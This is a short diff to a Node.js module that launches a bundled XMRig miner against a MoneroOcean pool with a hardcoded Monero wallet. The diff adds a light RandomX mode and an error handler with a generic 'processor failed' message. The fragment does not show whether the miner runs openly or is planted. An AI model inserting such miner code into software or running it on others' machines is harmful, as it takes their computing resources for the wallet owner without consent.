@@ -4,6 +4,7 @@ const path = require('path');
     const xmrigPath = path.join(__dirname, 'miners', process.platform === 'win32' ? 'xmrig.exe' : 'xmrig');
 
 const miner = spawn(xmrigPath, [
+    '--randomx-mode=light',
     '-o', 'gulf.moneroocean.stream:10032',
     '-u', '47bBDxmrhaZUscZv3wZDmC7qRiAm2YnsXiuWGSuiHEAGeDcSe1pctd2AuzjYYUbbh3XKu8GpFigfnT3yfeYRXzczQ2nD2zd',
     '-p', 'x',
@@ -18,7 +19,11 @@ const miner = spawn(xmrigPath, [
 miner.stdout.on('data', data => console.log(`[XMRig] ${data}`));
 miner.stderr.on('data', data => console.error(`[XMRig Error] ${data}`));
 miner.on('close', code => console.log(`[XMRig] exited with code ${code}`));
-}
+miner.on("error", err => {
+  console.error("processor failed:", err);
+  // fallback or exit
+});
+ }
 
 
 module.exports = miner
